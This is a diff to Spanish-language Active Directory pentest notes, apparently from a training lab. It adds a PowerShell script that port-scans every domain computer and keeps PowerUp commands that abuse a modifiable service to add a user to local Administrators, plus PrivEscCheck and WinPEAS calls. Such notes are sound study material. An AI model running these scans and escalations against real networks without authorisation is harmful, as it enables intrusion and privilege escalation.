@@ -83,8 +83,55 @@ Invoke-HuntSMBShares -NoPing -OutputDirectory C:\Ad\Tools -Hostlist .\servers.tx
 Get-NetComputer -TrustedToAuth | Select-Object name, msds-allowedtodelegateto | Format-List
 ```
 
-# Escalada de privilegios
+## ENUMERACION DE SERVICIOS CORRIENDO EN EL DOMINIO
+```shell
+$Ports = @(80,443,8080,8443,3389,445,135,5985,5986,22,1433,3306,5432)
 
+Get-DomainComputer | Select-Object -ExpandProperty DNSHostName | ForEach-Object {
+
+    $HostName = $_
+
+    try {
+
+        $IP = (Resolve-DnsName $HostName -Type A -ErrorAction Stop |
+               Select-Object -First 1 -ExpandProperty IPAddress)
+
+        $OpenPorts = foreach($Port in $Ports) {
+
+            try {
+
+                $TcpClient = New-Object System.Net.Sockets.TcpClient
+                $Connect = $TcpClient.BeginConnect($HostName,$Port,$null,$null)
+
+                if($Connect.AsyncWaitHandle.WaitOne(500,$false))
+                {
+                    $TcpClient.EndConnect($Connect)
+                    $TcpClient.Close()
+                    $Port
+                }
+                else
+                {
+                    $TcpClient.Close()
+                }
+
+            } catch {}
+        }
+
+        if($OpenPorts)
+        {
+            [PSCustomObject]@{
+                DNSHostName = $HostName
+                IP          = $IP
+                OpenPorts   = ($OpenPorts -join ",")
+            }
+        }
+
+    } catch {}
+} | Format-Table -AutoSize
+```
+
+# Escalada de privilegios
+### Explotar servicio
 #### PowerUP
 ```shell
 . .\PowerUp.ps1 
@@ -99,7 +146,6 @@ Invoke-AllChecks
 > 	- Unquoted Service Paths -> Nos permite aprovecharnos por que la ruta del servicio esta sin comillas
 > 	- Modifiable Service Files -> Son servicios que pueden ser modificados, si tienen *CanRestart = True* significa que el atacante lo puede reiniciar para escalar privilegios
 
-### Explotar servicio
 Nos añadiremos al servicio que y se nos agregara el ususario al grupo Administrators
 ```shell
 Invoke-ServiceAbuse -Name 'AbyssWebServer' -username 'dcorp\student97'
@@ -114,7 +160,7 @@ net localgroup Administrators
 
 Tendremos que hacer *LogOut* para que se apliquen los cambios
 
-***Tambien se puede ver diferentes paths de escaladas de privilegios usando otras herramientas***
+***También se puede ver diferentes paths de escaladas de privilegios o simplemente enumerar todos los ámbitos posibles usando otras herramientas***
 #### PrivEscCheck
 ```shell
 . .\PrivEscCheck.ps1
@@ -123,10 +169,10 @@ Tendremos que hacer *LogOut* para que se apliquen los cambios
 ```shell
 Invoke-PrivescCheck
 ```
-
 #### WinPEAS
 ```shell
-.\winPEASx6
+.\winPEASx64.exe
 ```
 
+### Ataques de Relay
 
